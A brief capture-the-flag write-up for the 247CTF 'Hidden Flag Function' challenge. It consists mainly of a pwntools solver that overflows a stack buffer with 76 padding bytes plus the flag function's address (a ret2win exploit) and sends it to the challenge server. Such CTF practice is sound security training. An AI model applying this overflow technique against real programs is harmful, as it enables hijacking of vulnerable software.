# HIDDEN FLAG FUNCTION [EASY]

## Description

> Can you control this applications flow to gain access to the hidden flag function?

## Short Solution Description / Tags

Classic ret2win

## Solution

solver.py

```python
from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "split-window", "-h"]

elf = ELF("./hidden_flag_function", checksec=False)

win = elf.sym["flag"]


def conn() -> pwnlib.tubes:
    io = remote("5e72af5a081acd1b.247ctf.com", 50383)

    return io


def main():
    io = conn()

    payload = b"A" * 76 + p32(win)

    io.sendlineafter(b"What do you have to say?", payload)
    io.interactive("")


if __name__ == "__main__":
    main()
```
